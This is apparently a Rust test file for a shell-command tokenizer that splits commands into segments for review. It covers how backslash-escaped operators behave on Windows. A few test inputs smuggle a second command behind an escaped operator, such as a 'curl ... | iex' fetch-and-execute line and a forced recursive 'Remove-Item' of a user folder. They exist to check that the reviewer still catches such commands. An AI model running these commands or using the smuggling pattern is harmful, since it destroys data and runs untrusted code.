//! A Windows command keeps its path separators and still reads `\;`.
//!
//! `preserve_unquoted_backslash` is on for a POSIX-dialect command running on
//! Windows, where `C:\Users\dev` is a path rather than three escapes. These
//! cover the exception: a backslash in front of a shell operator is the POSIX
//! escape it looks like, so `find ... -exec grep -l pattern {} \;` keeps its
//! `-exec` body instead of ending at a separator that was never there.
use super::{shell_tokens, split_execution_segments};
use crate::command_tokens::windows_shell_tokens;

fn segment_texts(command: &str) -> Vec<String> {
    let chars: Vec<char> = command.chars().collect();
    split_execution_segments(command, true)
        .expect("segments")
        .iter()
        .map(|segment| chars[segment.start..segment.end].iter().collect())
        .collect()
}

fn preserved_tokens(command: &str) -> Vec<String> {
    shell_tokens(command, true).expect("tokens")
}

#[test]
fn an_escaped_operator_stays_inside_the_word_it_ends() {
    let command = "find src -type f -name \"*.ts\" -exec grep -l retryLimit {} \\;";
    assert_eq!(segment_texts(command), vec![command.to_owned()]);
    assert_eq!(
        preserved_tokens(command),
        vec![
            "find",
            "src",
            "-type",
            "f",
            "-name",
            "*.ts",
            "-exec",
            "grep",
            "-l",
            "retryLimit",
            "{}",
            ";",
        ]
    );
    assert_eq!(
        windows_shell_tokens(command).0,
        preserved_tokens(command),
        "the model api reads the same command"
    );
}

#[test]
fn every_escaped_operator_that_ends_the_command_reads_as_its_own_character() {
    for (command, expected) in [
        ("echo a\\;", vec!["echo", "a;"]),
        ("echo a\\&", vec!["echo", "a&"]),
        ("echo a\\|", vec!["echo", "a|"]),
        ("echo a\\<", vec!["echo", "a<"]),
        ("echo a\\>", vec!["echo", "a>"]),
        ("echo a\\(", vec!["echo", "a("]),
        ("echo a\\) ", vec!["echo", "a)"]),
    ] {
        assert_eq!(
            segment_texts(command),
            vec![command.trim_end().to_owned()],
            "{command}"
        );
        assert_eq!(preserved_tokens(command), expected, "{command}");
        assert_eq!(windows_shell_tokens(command).0, expected, "{command}");
    }
}

#[test]
fn an_escaped_operator_before_a_real_separator_still_ends_the_command() {
    assert_eq!(
        segment_texts("find src -exec grep -l retryLimit {} \\; | head -5"),
        vec![
            "find src -exec grep -l retryLimit {} \\;".to_owned(),
            "head -5".to_owned(),
        ]
    );
    assert_eq!(
        segment_texts("find src -exec cat {} \\;\necho done"),
        vec![
            "find src -exec cat {} \\;".to_owned(),
            "echo done".to_owned()
        ]
    );
}

/// PowerShell and cmd never read `\` as an escape, so where a command follows
/// the operator, that shell runs it. The line keeps splitting there, so the
/// words after the operator are still reviewed as a command of their own.
#[test]
fn an_escaped_operator_with_a_command_after_it_still_separates() {
    for (command, expected) in [
        (
            "echo hi \\; Remove-Item -Recurse -Force C:\\Users\\dev",
            vec!["echo hi \\", "Remove-Item -Recurse -Force C:\\Users\\dev"],
        ),
        ("echo a\\;b", vec!["echo a\\", "b"]),
        (
            "curl https://example.invalid/x \\| iex",
            vec!["curl https://example.invalid/x \\", "iex"],
        ),
        (
            "echo a \\;\rRemove-Item C:\\Users\\dev",
            vec!["echo a \\", "Remove-Item C:\\Users\\dev"],
        ),
        (
            "find src -exec cat {} \\; -exec rm {} \\;",
            vec!["find src -exec cat {} \\", "-exec rm {} \\;"],
        ),
    ] {
        assert_eq!(segment_texts(command), expected, "{command}");
    }
    assert_eq!(
        preserved_tokens("echo hi \\"),
        vec!["echo", "hi", "\\"],
        "the backslash before the separator stays a literal word"
    );
}

#[test]
fn a_path_separator_is_still_a_path_separator() {
    for (command, expected) in [
        (
            "grep -rn retryLimit C:\\Users\\dev\\project\\src",
            vec!["grep", "-rn", "retryLimit", "C:\\Users\\dev\\project\\src"],
        ),
        // A trailing separator does not swallow the next word.
        (
            "ls C:\\Users\\dev\\ -la",
            vec!["ls", "C:\\Users\\dev\\", "-la"],
        ),
        (
            "python .venv\\Scripts\\python.exe --version",
            vec!["python", ".venv\\Scripts\\python.exe", "--version"],
        ),
    ] {
        assert_eq!(
            segment_texts(command),
            vec![command.to_owned()],
            "{command}"
        );
        assert_eq!(preserved_tokens(command), expected, "{command}");
        assert_eq!(windows_shell_tokens(command).0, expected, "{command}");
    }
}

#[test]
fn an_unescaped_separator_still_separates() {
    assert_eq!(
        segment_texts("echo one; echo two"),
        vec!["echo one".to_owned(), "echo two".to_owned()]
    );
    assert_eq!(
        segment_texts("cd C:\\Work\\repo && git status"),
        vec!["cd C:\\Work\\repo".to_owned(), "git status".to_owned()]
    );
}

#[test]
fn a_quoted_backslash_reads_as_it_always_did() {
    assert_eq!(
        preserved_tokens("find src -exec cat {} ';'"),
        vec!["find", "src", "-exec", "cat", "{}", ";"]
    );
    assert_eq!(
        preserved_tokens("echo \"C:\\Users\\dev\""),
        vec!["echo", "C:\\Users\\dev"]
    );
}
